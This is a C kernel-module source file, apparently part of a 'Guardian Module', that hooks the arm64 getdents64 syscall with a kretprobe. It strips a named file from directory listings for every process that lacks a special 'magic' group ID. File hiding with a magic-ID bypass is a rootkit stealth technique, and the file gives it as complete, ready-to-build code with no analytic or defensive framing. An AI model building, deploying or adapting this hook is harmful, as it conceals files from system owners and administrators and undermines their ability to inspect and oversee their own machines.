// SPDX-License-Identifier: GPL-2.0
/*
 * cloak_kp.c — Guardian Module (kprobe variant), Part 3
 *
 * Kretprobe on __arm64_sys_getdents64: hides PROTECTED_BASENAME
 * from directory listings unless the caller has MAGIC_GID.
 *
 * Entry handler: saves dirp via double pt_regs.
 * Return handler: filters dirent buffer, adjusts byte count.
 */

#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <asm/ptrace.h>
#include "guardian_kprobe.h"

struct cloak_data {
	struct linux_dirent64 __user *dirp;
};

static int cloak_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct pt_regs *inner_regs = (struct pt_regs *)regs->regs[0];
	struct cloak_data *data = (struct cloak_data *)ri->data;

	/* dirp is the second syscall arg → regs[1] of the inner pt_regs */
	data->dirp = (struct linux_dirent64 __user *)inner_regs->regs[1];

	return 0;
}

static int cloak_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct cloak_data *data = (struct cloak_data *)ri->data;
	struct linux_dirent64 __user *dirp = data->dirp;
	struct linux_dirent64 *current_dir, *prev = NULL;
	int total_bytes = regs_return_value(regs);
	char *kbuf;
	int offset = 0;

	/* Nothing to filter if getdents64 returned 0 or error */
	if (total_bytes <= 0)
		return 0;

	/* Privileged user sees everything */
	if (guardian_has_magic_gid())
		return 0;

	/* Atomic because kretprobe handlers run in atomic context */
	kbuf = kmalloc(total_bytes, GFP_ATOMIC);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, dirp, total_bytes)) {
		kfree(kbuf);
		return 0;
	}

	/* Walk the dirent buffer and remove matching entries */
	while (offset < total_bytes) {
		current_dir = (struct linux_dirent64 *)(kbuf + offset);

		if (strcmp(current_dir->d_name, PROTECTED_BASENAME) != 0) {
			/* No match — advance */
			prev = current_dir;
			offset += current_dir->d_reclen;
		} else if (prev) {
			/* Match, not first entry: prev absorbs current */
			prev->d_reclen += current_dir->d_reclen;
			offset += current_dir->d_reclen;
		} else {
			/* Match, first entry: shift everything forward */
			int reclen = current_dir->d_reclen;

			total_bytes -= reclen;
			memmove(kbuf, kbuf + reclen, total_bytes);
			/* Don't advance offset — new data is at same position */
		}
	}

	/* Write filtered buffer back to userspace and fix return value */
	copy_to_user(dirp, kbuf, total_bytes);
	regs->regs[0] = total_bytes;

	kfree(kbuf);
	return 0;
}

static struct kretprobe cloak_krp = {
	.handler       = cloak_return,
	.entry_handler = cloak_entry,
	.data_size     = sizeof(struct cloak_data),
	.maxactive     = 20,
	.kp.symbol_name = "__arm64_sys_getdents64",
};

int cloak_init(void)
{
  int ret = register_kretprobe(&cloak_krp);
  if (ret < 0){
    pr_err("failed to register kretprobe: %d\n", ret);
    return ret;
  }

  return 0;
}

void cloak_exit(void)
{
  unregister_kretprobe(&cloak_krp);
}
